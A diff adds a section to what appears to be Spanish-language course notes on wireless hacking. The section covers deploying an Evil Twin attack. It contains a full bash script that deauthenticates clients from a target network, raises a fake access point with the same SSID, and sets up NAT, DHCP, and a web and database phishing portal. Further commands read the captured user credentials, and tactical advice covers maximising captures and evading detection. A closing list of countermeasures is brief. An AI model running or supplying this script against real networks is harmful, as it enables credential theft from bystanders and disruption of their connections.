@@ -1726,3 +1726,122 @@ iptables -A FORWARD -i at0 -o eth0 -m limit --limit 1000/s -j ACCEPT
 - Implementar HSTS (HTTP Strict Transport Security) en sitios web
 - Configurar DNS sobre HTTPS (DoH) o DNS sobre TLS (DoT)
 - Utilizar herramientas de detección de ARP spoofing y manipulación de DNS
+
+
+## 49. EvilTwin - Desplegando finalmente el ataque
+
+Este video muestra la ejecución completa del ataque Evil Twin, integrando todos los componentes configurados en los videos anteriores para crear un ataque funcional que capture credenciales de usuarios.
+
+### Fundamento técnico:
+- El ataque Evil Twin completo combina múltiples técnicas y herramientas
+- Requiere la coordinación precisa de varios servicios (punto de acceso, DHCP, DNS, portal cautivo, base de datos)
+- El monitoreo continuo durante el ataque permite ajustes en tiempo real
+
+### Procedimiento detallado para el despliegue:
+
+#### 1. Inicio de servicios
+```bash
+# Iniciar servidor DHCP
+dhcpd -cf /etc/dhcpd/dhcpd.conf -pf /var/run/dhcpd.pid at0
+touch /var/lib/dhcp/dhcpd.leases
+# Monitorear las conexiones
+tail -f /var/log/apache2/access.log
+```
+
+#### 2. También se puede realizar un script de automatización 
+```bash
+#!/bin/bash
+# evil_twin_deploy.sh - Script para automatizar el despliegue del ataque Evil Twin
+
+# Configuración
+INTERFACE="wlan0"
+TARGET_SSID="RedObjetivo"
+TARGET_CHANNEL="6"
+TARGET_BSSID="00:11:22:33:44:55"
+
+# Detener servicios que puedan interferir
+echo "[+] Deteniendo servicios..."
+airmon-ng check kill
+
+# Iniciar modo monitor
+echo "[+] Iniciando modo monitor..."
+airmon-ng start $INTERFACE
+
+# Desautenticar clientes
+echo "[+] Desautenticando clientes..."
+aireplay-ng -0 5 -a $TARGET_BSSID ${INTERFACE}mon &
+DEAUTH_PID=$!
+
+# Iniciar punto de acceso
+echo "[+] Iniciando punto de acceso falso..."
+airbase-ng -e "$TARGET_SSID" -c $TARGET_CHANNEL ${INTERFACE}mon &
+AIRBASE_PID=$!
+
+# Esperar a que se cree la interfaz at0
+sleep 5
+
+# Configurar interfaz
+echo "[+] Configurando interfaz at0..."
+ifconfig at0 up
+ifconfig at0 192.168.1.1 netmask 255.255.255.0
+
+# Configurar iptables
+echo "[+] Configurando iptables..."
+iptables -F
+iptables -t nat -F
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
+iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
+
+# Activar IP forwarding
+echo "[+] Activando IP forwarding..."
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Iniciar DHCP
+echo "[+] Iniciando servidor DHCP..."
+dhcpd -cf /etc/dhcp/dhcpd.conf at0
+
+# Iniciar servicios web y base de datos
+echo "[+] Iniciando servicios web y base de datos..."
+service apache2 start
+service mysql start
+
+echo "[+] Ataque Evil Twin desplegado correctamente"
+echo "[+] Monitorizando conexiones..."
+tail -f /var/log/apache2/access.log
+```
+
+### Monitoreo y gestión del ataque:
+
+#### Verificación de clientes conectados
+```bash
+# Ver clientes DHCP
+cat /var/lib/dhcp/dhcpd.leases
+
+# Ver tabla ARP
+arp -a
+
+# Monitorear tráfico
+tcpdump -i at0 -n
+```
+
+#### Captura de credenciales
+```bash
+# Monitorear archivo de credenciales
+tail -f /var/www/html/credentials.txt
+
+# Consultar base de datos
+mysql -u root -p -e "SELECT * FROM evil_twin.credentials;"
+```
+
+### Consideraciones tácticas:
+- **Timing**: Desplegar el ataque en momentos de alta afluencia de usuarios para maximizar capturas
+- **Duración**: Limitar la duración del ataque para reducir la probabilidad de detección
+- **Ubicación**: Posicionar el equipo para obtener mejor señal que el AP original
+
+### Contramedidas y detección:
+- Sistemas de detección de intrusiones inalámbricas (WIDS) que alerten sobre APs no autorizados
+- Análisis de comportamiento de red para identificar patrones sospechosos
+- Educación de usuarios para verificar la autenticidad de las redes
+- Implementación de políticas de seguridad que requieran VPN para conexiones remotas
